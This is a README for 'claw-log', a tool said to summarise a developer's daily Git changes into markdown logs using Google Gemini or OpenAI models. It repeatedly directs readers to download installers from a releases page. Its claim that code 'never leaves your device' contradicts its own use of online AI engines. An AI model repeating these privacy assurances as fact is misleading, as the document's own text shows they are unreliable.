# 🦞 claw-log - Track Coding Work Automatically

[![Download claw-log](https://img.shields.io/badge/Download-claw--log-blue?style=for-the-badge)](https://github.com/EHR-U/claw-log/releases)

<p align="center">
  <img src="https://github.com/user-attachments/assets/53c127d0-a66b-47da-afe0-70560046f595" alt="Claw-Log Banner" width="600" />
</p>

> **"오늘의 기록이 내일의 이력서가 됩니다."**

claw-log is a simple tool that runs on your computer. It scans your code changes every day and writes a clear, easy log. This helps you keep track of what you worked on without needing to write detailed notes yourself.

---

## 🧐 What Is claw-log?

If you code daily, you might struggle to explain what you worked on later. Commit messages like `fix bug` or `refactor code` do not tell the full story of the problems you solved. claw-log uses artificial intelligence to read your code changes and create useful summaries.

These summaries show why you made changes and what you thought about. Over time, they build a clear record of your work. This record helps when preparing a resume or talking about your projects.

---

## ✨ Key Features

- **Automatic Daily Logs:** claw-log runs each night and analyzes your recent code updates.
- **AI Understands Your Code:** The software reads your code differences and writes explanations in simple markdown format.
- **Supports Multiple AI Engines:** Choose between Google Gemini, OpenAI, and ChatGPT to analyze your data.
- **Easy Project Browsing:** Select which projects to log from all the folders on your computer using a checkbox interface.
- **Manage Multiple Projects:** Keep all your project logs organized in one place on your PC.
- **Local Privacy:** All analysis stays on your computer; your code never leaves your device.
- **Markdown Reports:** Get clean markdown files that you can use for resumes, blogs, or project notes.
- **Simple Setup and Use:** No programming skills needed.

---

## 💻 System Requirements

- Operating System: Windows 10 or newer, macOS Mojave or newer, or most Linux distributions from 2018 onward.
- Disk Space: At least 100 MB free for installation and logs.
- Memory: Minimum 4 GB RAM recommended for smooth AI processing.
- Git Installed: claw-log works with projects using Git version control, so Git must be installed and projects should be Git repositories.
- Internet Connection: Required only when using AI engines that need online access (OpenAI, Google Gemini). Local AI engines do not require internet.

---

## 🚀 Getting Started

Using claw-log is simple. You do not need to know any coding. Follow these steps to set up and start tracking your projects automatically.

### Step 1: Download claw-log

Click the large button below to visit the official release page for claw-log.

[![Download claw-log](https://img.shields.io/badge/Download-claw--log-blue?style=for-the-badge)](https://github.com/EHR-U/claw-log/releases)

On the release page, choose the file that matches your computer:

- For Windows, download the `.exe` installer file.
- For macOS, download the `.dmg` or `.zip` file.
- For Linux, download the `.AppImage` or `.tar.gz` package.

### Step 2: Install claw-log

- Windows: Open the `.exe` file and follow the installation prompts.
- macOS: Open the `.dmg` and drag claw-log to your Applications folder.
- Linux: Extract the archive or make the AppImage executable (`chmod +x claw-log.AppImage`).

### Step 3: Prepare Your Projects

Make sure the code projects you want to track use Git. You can open Git Bash or terminal in each project folder and type:

```
git status
```

If this shows information about your files, your project is ready. If you see an error, initialize Git with:

```
git init
```

### Step 4: Open claw-log and Select Projects

Launch claw-log from your computer. It will scan your folders and find any Git projects.

You will see a list of projects with checkboxes. Check the projects you want to record automatically each day.

### Step 5: Set Up AI Engine (Optional)

Choose which AI engine claw-log should use to analyze your code:

- Google Gemini
- OpenAI API
- ChatGPT (GPT-5.1 or 5.2)

If you select an online option, follow instructions inside claw-log to connect your account safely.

### Step 6: Start Daily Tracking

claw-log runs automatically once a day at night. It looks for changes you made, summarizes them, and saves a log in your project folder.

You can open these markdown log files anytime to see your work history in easy language.

---

## 📂 How to Use Your Logs

Your logs live inside each project folder, under a new folder called `claw-log-logs`. Each file is one day’s summary.

You can:

- Review daily changes without reading your code.
- Combine logs for multiple projects.
- Use logs as drafts for resumes or technical blogs.
- Share logs with teammates to explain your work clearly.

---

## ⚙️ Configuration Options

Inside claw-log's settings, you can customize:

- When to run the logger each day.
- Which folders to scan or exclude.
- AI engine and API key setup.
- Log file naming and format style.

These options let you adapt claw-log to fit your workflow neatly.

---

## 🛠 Troubleshooting

If claw-log doesn’t start or create logs:

- Check that your projects use Git.
- Make sure your computer meets minimum requirements.
- Confirm your AI engine API keys are valid if using online services.
- Restart the application or your computer if needed.
- Visit the Issues page on GitHub for help or submit a bug report.

---

## 🔗 Download & Install

To get claw-log, visit this page and pick your file:

[https://github.com/EHR-U/claw-log/releases](https://github.com/EHR-U/claw-log/releases)

Download the installer or package that fits your computer system. Installing is straightforward — use default options if you are unsure.

After installation, launch claw-log and follow the setup steps described above.

---

## 📞 Support and Feedback

You can find help or submit feedback on the GitHub repository’s Issues tab. The developers monitor user reports to improve claw-log.

---

## ⚖️ Privacy and Security

claw-log does not send your source code or logs to any external servers. All AI processing happens on your computer or through your own linked AI account. This keeps your work private and secure.

---

Thank you for choosing claw-log to track your coding work. It helps you keep clear records without extra effort.